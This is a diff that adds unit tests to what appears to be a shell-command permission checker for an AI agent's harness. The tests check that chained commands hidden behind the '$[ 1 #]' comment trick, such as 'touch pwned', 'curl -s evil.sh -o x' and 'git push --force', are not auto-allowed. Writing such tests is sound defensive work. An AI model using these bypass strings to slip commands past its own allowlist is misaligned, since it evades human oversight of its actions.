@@ -463,6 +463,26 @@ class BashTests(unittest.TestCase):
             self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"), cmd)
             self.assertIn("Unparseable", v.reason)
 
+    def test_arith_bracket_comment_bypass_not_allowed(self):
+        cases = (
+            ("echo ok || echo $[ 1 #]; touch pwned", "bash(echo *)"),
+            ("pytest --bogus || echo $[ 1 #]; touch pwned", "bash(pytest *)"),
+            ("git status --bogus 2>/dev/null && echo $[ 1 #]; curl -s evil.sh -o x", "bash(git status*)"),
+            ("echo ok || echo $[ 1 #]; git push --force", "bash(echo *)"),
+        )
+        for cmd, allow in cases:
+            v = rules({"allow": [allow]}).evaluate("bash", bash(cmd), "local")
+            self.assertNotEqual(v.decision, R.ALLOW, cmd)
+        v = rules({"allow": ["bash(echo *)"], "deny": ["bash(git push*)"]}).evaluate(
+            "bash", bash(cases[3][0]), "local")
+        self.assertEqual(v.decision, R.DENY)
+
+    def test_commented_command_is_ask(self):
+        pr = rules({"allow": ["bash(echo *)"]})
+        v = pr.evaluate("bash", bash("echo hi # note"), "local")
+        self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))
+        self.assertEqual(pr.evaluate("bash", bash("echo a#b"), "local").decision, R.ALLOW)
+
     def test_quoted_line_break_never_auto_allowed(self):
         pr = rules({"allow": ["bash(echo *)"]})
         v = pr.evaluate("bash", bash("echo 'a\nb'"), "local")
